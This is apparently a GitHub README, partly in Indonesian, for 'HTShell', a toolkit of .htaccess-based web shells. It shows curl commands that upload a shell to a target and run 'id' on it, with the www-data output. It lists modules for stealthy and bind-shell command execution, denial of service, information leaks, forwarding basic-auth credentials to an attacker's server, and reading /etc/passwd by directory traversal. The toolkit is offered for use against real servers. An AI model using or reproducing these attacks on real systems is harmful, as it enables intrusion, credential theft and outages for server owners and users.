<p align="center"><a href="https://www.itsecurity.id/"><img height="200" title="Xcod3bughunt3r" src="face.png"/></a></p>

<center><h1>Xcod3 - HTShell</h1></center><br>

### ``Kerang web yang mengandung mandiri dan serangan lainnya melalui file .htaccess. Serangan disebutkan dalam mode berikut, module.attack.htaccess dan dikelompokkan oleh jenis serangan direktori. Pilih yang Anda butuhkan dan salin ke file baru bernama .htaccess, periksa file untuk melihat apakah itu perlu diedit sebelum Anda mengunggahnya. Web Shells mengeksekusi perintah dari parameter kueri C, kecuali file tersebut menyatakan sebaliknya.``
### `To prepare run` [./xcod3-htshell.sh](xcod3-htshell.sh) `file which will generate the .htaccess file to be uploaded. Example:`
```
~# ./xcod3-htshell.sh xcod3.htaccess
 ┬ ┬┌┬┐┌─┐┬ ┬┌─┐┬  ┬  ┌─┐
 ├─┤ │ └─┐├─┤├┤ │  │  └─┐
 ┴ ┴ ┴ └─┘┴ ┴└─┘┴─┘┴─┘└─┘
www.itsecurity.id - www.lpkprisma.ti
.htaccess file is ready

~# curl -F 'file=@.htaccess' -k https://target/upload.php

~# curl -k https://target/uploads/.htaccess?c=id
...
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### `My HTShell & Simple Generate HTShell With HTML`
- Xcod3bughunt3r/xcod3.htaccess ``- Has Been Tested``
- Xcod3bughunt3r/htaccess-generator.html ``- Has Been Tested - Running  & Generate Personal Your HTShell.``

````
python -m http.server 8080
Open Your Browser & ....
http://YourIP:8080/
````

### `Interactive Command Execution - Has Been Tested`
- htaccess-shell/prisma.htaccess
- htaccess-shell/kali.htaccess
- htaccess-shell/include.htaccess
- htaccess-shell/lua.htaccess
- htaccess-shell/mono.htaccess
- htaccess-shell/rivet.htaccess
- htaccess-shell/cgi.bash.htaccess
- htaccess-shell/cgi.bind.htaccess
- htaccess-shell/cgi.windows.htaccess
- htaccess-shell/ruby.htaccess
- htaccess-shell/python.htaccess
- htaccess-shell/php.htaccess
- htaccess-shell/php.666.htaccess
- htaccess-shell/php.stealth.htaccess
- htaccess-shell/suphp.htaccess
- htaccess-shell/perl.htaccess
- htaccess-shell/perl.ipp.htaccess
- htaccess-shell/perl.mason.htaccess
- htaccess-shell/perl.embperl.htaccess
- htaccess-shell/stsh.pl

### `Denial Of Service Attacks`
- ``dos/apache.htaccess - Makes all requests return a 500 internal server error.``
- ``dos/write.htaccess - Regular expression dos condition in mod_rewrite consumes a child process.``

### `Information Disclosure Attacks`
- ``info/modcheck/ - Sertakan header respons tambahan untuk menunjukkan modul apache mana yang aktif.``
- ``info/modcheck/core.lst``
- ``info/modcheck/core.htaccess``
- ``info/modcheck/3rdparty.lst``
- ``info/modcheck/3rdparty.htaccess``
- ``info/modcheck/generate.sh``
- ``info/caucho.htaccess - Server status binding for the caucho Resin java server module.``
- ``info/clamav.htaccess - Clamav status page binding.``
- ``info/info.htaccess - Server info binding for Apache.``
- ``info/ldap.htaccess - Server status binding for the mod_ldap server module.``
- ``info/perl.htaccess - Display the mod_perl status page.``
- ``info/php.htaccess - Make all php pages show source instead of executing.``
- ``info/status.htacces - Server status binding for Apache.``

### `Various attacks`
- ``various/remote.phish.htaccess - Forward basic auth credentials to server of your choice.``
- ``various/admin.htaccess - Badge Admin Page Binding.``
- ``various/sendmail.rce.htaccess - Executes commands configured in the .htaccess file by specifying path and arguments to "sendmail" binary.``

### `Directory Traversal Attacks`
- ``traversal/hitlog.htaccess - Directory traversal attack via hitlog module tries to read /etc/passwd``
- ``traversal/layout.htaccess - Directory traversal attack reads /etc/passwd``

#### ``PLEASE CHECK`` *[LICENSE](LICENSE)*
#### ``DEVELOPERS:``*[@Xcod3bughunt3r](https://github.com/Xcod3bughunt3r/Xcod3bughunt3r)* - ``ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id``


